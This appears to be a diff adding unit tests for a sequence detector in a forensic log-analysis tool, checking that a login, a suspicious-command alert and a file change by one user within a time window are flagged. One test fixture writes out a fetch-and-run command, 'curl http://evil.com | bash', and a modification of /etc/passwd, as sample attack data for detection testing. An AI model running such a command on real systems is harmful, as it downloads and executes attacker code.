@@ -21,6 +21,7 @@ from file_tracker import GhostFileTracker
 from history_parser import GhostHistoryParser
 from gap_detector import GhostGapDetector
 from evidence_collector import GhostEvidenceCollector
+from sequence_detector import SequenceDetector
 from ghosttrail import GhostTrail
 
 
@@ -457,6 +458,91 @@ class TestGhostTrailIntegration(unittest.TestCase):
         content = Path(out).read_text()
         self.assertIn("GHOST-TRAIL", content)
         self.assertIn("shadowfox.se", content)
+
+
+class TestSequenceDetector(unittest.TestCase):
+    def _login(self, user, t):
+        return {"time": t, "type": "LOGIN", "msg": f"User '{user}' session from 192.168.1.1", "level": "INFO"}
+
+    def _alert(self, user, t):
+        return {"time": t, "type": "ALERT", "msg": f"CRITICAL: User '{user}' suspicious command: curl http://evil.com | bash", "level": "CRITICAL"}
+
+    def _file(self, t):
+        return {"time": t, "type": "FILE", "msg": "Modified: /etc/passwd (1234 bytes)", "level": "INFO"}
+
+    def test_full_sequence_detected(self):
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._alert("alice", "2026-04-21 10:03:00"),
+            self._file("2026-04-21 10:05:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline)
+        self.assertEqual(len(seqs), 1)
+        self.assertEqual(seqs[0]["type"], "SEQUENCE")
+        self.assertEqual(seqs[0]["user"], "alice")
+        self.assertEqual(seqs[0]["level"], "CRITICAL")
+
+    def test_no_matching_alert_gives_no_sequence(self):
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._file("2026-04-21 10:05:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline)
+        self.assertEqual(len(seqs), 0)
+
+    def test_no_file_event_gives_no_sequence(self):
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._alert("alice", "2026-04-21 10:03:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline)
+        self.assertEqual(len(seqs), 0)
+
+    def test_window_respected(self):
+        # alert is 20 minutes after login, window is 10 — should not match
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._alert("alice", "2026-04-21 10:20:00"),
+            self._file("2026-04-21 10:05:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline, window_minutes=10)
+        self.assertEqual(len(seqs), 0)
+
+    def test_multi_user_isolation(self):
+        # alice has a full sequence; bob only has login+alert, no file in window
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._alert("alice", "2026-04-21 10:02:00"),
+            self._file("2026-04-21 10:04:00"),
+            self._login("bob", "2026-04-21 11:00:00"),
+            self._alert("bob", "2026-04-21 11:02:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline)
+        self.assertEqual(len(seqs), 1)
+        self.assertEqual(seqs[0]["user"], "alice")
+
+    def test_duplicate_suppressed(self):
+        # Same login appears twice — only one sequence should be generated
+        entry = self._login("alice", "2026-04-21 10:00:00")
+        timeline = [
+            entry, entry,
+            self._alert("alice", "2026-04-21 10:02:00"),
+            self._file("2026-04-21 10:04:00"),
+        ]
+        seqs = SequenceDetector().detect(timeline)
+        self.assertEqual(len(seqs), 1)
+
+    def test_sequence_steps_present(self):
+        timeline = [
+            self._login("alice", "2026-04-21 10:00:00"),
+            self._alert("alice", "2026-04-21 10:03:00"),
+            self._file("2026-04-21 10:05:00"),
+        ]
+        seq = SequenceDetector().detect(timeline)[0]
+        self.assertEqual(len(seq["steps"]), 3)
+        self.assertEqual(seq["steps"][0]["type"], "LOGIN")
+        self.assertEqual(seq["steps"][1]["type"], "ALERT")
+        self.assertEqual(seq["steps"][2]["type"], "FILE")
 
 
 if __name__ == "__main__":
